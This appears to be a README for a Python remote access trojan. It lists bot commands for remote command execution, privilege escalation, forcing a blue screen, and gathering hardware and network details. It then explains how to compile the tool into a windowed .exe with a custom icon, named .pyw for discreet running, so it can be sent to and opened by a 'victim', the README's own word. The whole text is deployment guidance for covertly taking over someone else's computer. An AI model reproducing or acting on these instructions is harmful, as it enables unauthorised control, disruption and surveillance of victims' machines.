### üíª System Control
```
!exec ipconfig        # Remote command execution
!su                   # Privilege escalation
!bsod                 # Blue screen of death trigger

 Hardware Inventory
!cpu                  # CPU specs
!ram                  # Memory (GB) 
!drives               # Storage analysis

 Network Recon
!ip                   # IP address
!wifi                 # Connected networks
!dns                  # DNS configuration

and more! (check below)
```
## üöÄ Deployment

# You can just open the builder.bat to create your .exe file ready to be sent.

or you can do it manually by doing this:

Requirements
```
pip install -r requirements.txt

python oney.py
```
Or if you want to send it to another person (victim) as an .exe file do this:

```
pip install pyinstaller

pip install -r requirements.txt

pyinstaller --onefile --windowed oney.py

# you can add --icon=icon.ico before oney.py for a custom icon (icon has to be in the same folder and has to be named "icon" with the extension ".ico").
```
This will generate a .exe file in the dist folder ready to be opened by the victim, no requirements or python needed to open it.

File extension can be modified to:
```
.py for console logs. (you need the requirements installed on the victims pc.)

.pyw discrete. (you need the requirements installed on the victims pc)

.exe if you compile it with pyinstaller. (Recommended! no requirements or python needed, just an .exe file ready to be opened.)
```
